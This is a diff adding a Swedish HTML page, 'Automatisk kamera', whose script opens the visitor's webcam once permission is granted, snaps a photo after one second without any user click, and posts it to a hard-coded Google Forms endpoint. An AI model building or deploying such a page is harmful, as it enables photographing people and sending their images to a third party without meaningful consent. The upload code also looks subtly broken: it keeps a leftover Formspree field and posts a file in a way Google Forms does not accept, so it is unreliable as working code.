@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="sv">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ta en bild</title>
+  <style>
+    body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding: 2rem; }
+    video, canvas { max-width: 100%; border-radius: 12px; margin-bottom: 1rem; }
+    #status { margin-top: 1rem; color: green; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h1>Automatisk kamera</h1>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <!-- Här har vi ersatt Formspree med Google Forms-länk -->
+  <form id="form" action="https://docs.google.com/forms/d/e/1FAIpQLSfRxRH57Dbjapr_7-e0ttystcLvI9629VK1Rq5L9ZfRwGpHqg/formResponse" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="_subject" value="Automatisk bild inskickad">
+    <input type="file" name="image" id="imageInput" accept="image/png, image/jpeg" style="display:none;">
+    <!-- Om du vill visa en knapp kan du lägga till en submit-knapp här -->
+  </form>
+  <p id="status">Väntar på kameragodkännande...</p>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const imageInput = document.getElementById('imageInput');
+    const form = document.getElementById('form');
+    const status = document.getElementById('status');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        status.textContent = 'Kamera aktiv – tar bild...';
+
+        video.addEventListener('loadedmetadata', () => {
+          setTimeout(() => {
+            takePhotoAndSend();
+          }, 1000); // Vänta lite innan foto tas
+        });
+      })
+      .catch(err => {
+        status.textContent = 'Kunde inte komma åt kameran: ' + err;
+      });
+
+    function takePhotoAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(blob => {
+        const file = new File([blob], 'bild.png', { type: 'image/png' });
+        const dataTransfer = new DataTransfer();
+        dataTransfer.items.add(file);
+        imageInput.files = dataTransfer.files;
+
+        form.submit();
+        status.textContent = '📤 Bild skickad!';
+      });
+    }
+  </script>
+</body>
+</html>
